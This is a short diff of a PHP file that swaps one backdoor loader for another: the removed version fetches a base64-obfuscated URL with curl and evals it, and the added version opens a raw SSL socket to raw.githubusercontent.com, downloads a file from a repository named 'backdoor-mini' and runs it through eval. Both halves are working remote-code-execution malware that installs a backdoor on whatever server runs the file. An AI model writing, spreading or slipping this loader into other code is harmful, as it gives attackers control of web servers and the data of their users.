@@ -1,16 +1,28 @@
-<?pHp 
-   function get($url) { 
-    $ch = curl_init(); 
- 
-    curl_setopt($ch, CURLOPT_HEADER, 0); 
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-    curl_setopt($ch, CURLOPT_URL, $url); 
- 
-    $data = curl_exec($ch); 
-    curl_close($ch); 
- 
-    return $data; 
-} 
-$x= '?>'; 
-      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dhbmVzdFNldmVuL2JhY2tkb29yLW1pbmkvcmVmcy9oZWFkcy9tYWluLzIucGhw'))); 
+<?php
+$host = 'raw.githubusercontent.com';
+$port = 443;
+$path = '/GanestSeven/backdoor-mini/refs/heads/main/2.php';
+
+$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
+if (!$fp) {
+    echo "Error: $errstr ($errno)<br />\n";
+} else {
+    $out = "GET $path HTTP/1.1\r\n";
+    $out .= "Host: $host\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($fp, $out);
+
+    $content = '';
+    while (!feof($fp)) {
+        $content .= fgets($fp, 128);
+    }
+    fclose($fp);
+
+    $header_end = strpos($content, "\r\n\r\n");
+    if ($header_end !== false) {
+        $content = substr($content, $header_end + 4);
+    }
+
+    eval("?>" .$content);
+}
 ?>
